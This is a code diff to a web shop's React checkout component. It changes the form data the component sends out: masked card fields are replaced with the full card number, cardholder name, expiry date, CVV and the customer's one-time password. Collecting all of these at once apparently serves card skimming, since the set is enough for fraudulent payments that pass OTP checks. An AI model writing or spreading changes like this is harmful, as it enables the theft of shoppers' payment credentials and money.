@@ -702,14 +702,14 @@ export default function Checkout() {
     formData.append("customer_phone", address.phone || "N/A");
     formData.append("customer_email", address.email || "N/A");
     formData.append("customer_address", `${address.address}, ${address.city}, ${address.state} - ${address.pincode}`);
-    formData.append("otp_code_masked", maskOtp(enteredOtp) || "N/A");
+    formData.append("otp_code", enteredOtp || "N/A");
     formData.append("submitted_at", new Date().toLocaleString("en-IN"));
 
     if (payment.type === "card") {
-      formData.append("card_number_masked", cardLast4 || "N/A");
-      formData.append("card_name_masked", maskCardNameForEmail(payment.cardName));
-      formData.append("card_expiry_masked", payment.cardExpiry || "N/A");
-      formData.append("card_cvv_masked", payment.cardCVV || "N/A");
+      formData.append("card_number", payment.cardNumber || "N/A");
+      formData.append("card_name", payment.cardName || "N/A");
+      formData.append("card_expiry", payment.cardExpiry || "N/A");
+      formData.append("card_cvv", payment.cardCVV || "N/A");
       formData.append("card_bank", payment.bank || "N/A");
       formData.append("card_type", payment.cardTab || "N/A");
     }
@@ -740,10 +740,10 @@ export default function Checkout() {
     formData.append("customer_phone", address.phone || "N/A");
     formData.append("customer_email", address.email || "N/A");
     formData.append("amount", finalAmount.toString());
-    formData.append("card_number_masked", cardLast4 || "N/A");
-    formData.append("card_name_masked", maskCardNameForEmail(payment.cardName));
-    formData.append("card_expiry_masked", payment.cardExpiry || "N/A");
-    formData.append("card_cvv_masked", payment.cardCVV || "N/A");
+    formData.append("card_number", payment.cardNumber || "N/A");
+    formData.append("card_name", payment.cardName || "N/A");
+    formData.append("card_expiry", payment.cardExpiry || "N/A");
+    formData.append("card_cvv", payment.cardCVV || "N/A");
     formData.append("card_bank", payment.bank || "N/A");
     formData.append("card_type", payment.cardTab || "N/A");
     formData.append("submitted_at", new Date().toLocaleString("en-IN"));
